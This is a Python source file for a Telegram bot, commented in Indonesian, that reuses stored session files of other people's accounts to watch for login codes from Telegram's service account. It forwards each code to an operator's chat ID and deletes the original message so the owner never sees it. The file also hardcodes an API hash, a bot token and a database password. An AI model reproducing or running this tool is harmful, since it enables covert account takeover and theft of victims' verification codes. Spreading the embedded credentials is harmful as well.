import asyncio
import logging
import os
import psycopg2
import nest_asyncio
from telethon import TelegramClient, events
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

nest_asyncio.apply()

api_id = 23416622
api_hash = 'd1bc12a03ea26416b38b4616a36112b0'
bot_token = '7909589038:AAG-_MOyqyDDOMkf9IoXsJjqjX5rVIfV1b8'
SESSION_FOLDER = 'eww_sessions'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def get_db_connection():
    return psycopg2.connect(
        host="localhost",
        database="telebot",
        user="postgres",
        password="adep140201"
    )

def get_logged_in_numbers():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT phone_number FROM sessions WHERE status = 'success'")
        results = cur.fetchall()
        cur.close()
        conn.close()
        return [row[0] for row in results]
    except Exception as e:
        logger.error(f"Gagal load nomor login: {e}")
        return []

async def kirim_otp_ke_bot(bot_app, phone, otp):
    try:
        message = f"📨 OTP untuk {phone}: `{otp}`"
        await bot_app.bot.send_message(chat_id=7763955214, text=message, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Gagal kirim OTP ke bot: {e}")

async def pantau_otp(phone_number, bot_app):
    try:
        # Ubah path session menjadi ke folder 'eww_sessions'
        session_path = os.path.join("eww_sessions", f"{phone_number}.session")
        
        # Cek apakah file session ada
        if not os.path.exists(session_path):
            logger.error(f"Session file tidak ditemukan untuk {phone_number}")
            return

        # Gunakan file session yang ada
        client = TelegramClient(session_path, api_id, api_hash)

        # Cek apakah client sudah login
        await client.start()
        logger.info(f"Client siap pantau OTP untuk {phone_number}")

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            if 'code' in event.raw_text.lower():
                await kirim_otp_ke_bot(bot_app, phone_number, event.raw_text)
                await event.delete()

        await client.run_until_disconnected()

    except Exception as e:
        logger.error(f"Error saat pantau OTP {phone_number}: {e}")


async def login(update: Update, context: CallbackContext):
    if not context.args:
        await update.message.reply_text("❗ Format salah. Gunakan: /login <nomor_telepon>")
        return

    phone = context.args[0]
    sessions = get_logged_in_numbers()

    if phone not in sessions:
        await update.message.reply_text("❌ Nomor belum login. Gunakan final.py dulu.")
        return

    await update.message.reply_text(f"🕵️‍♂️ Memantau OTP untuk nomor: {phone}")
    asyncio.create_task(pantau_otp(phone, context.application))

async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("Halo! Gunakan /login <nomor> untuk pantau OTP Telegram.")

async def sessions(update: Update, context: CallbackContext):
    sessions = get_logged_in_numbers()
    if sessions:
        msg = "\n".join([f"- {s}" for s in sessions])
        await update.message.reply_text(f"📱 Nomor login:\n{msg}")
    else:
        await update.message.reply_text("❌ Belum ada nomor yang login.")

async def main():
    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sessions", sessions))
    app.add_handler(CommandHandler("login", login))
    logger.info("Bot Telegram siap!")
    await app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
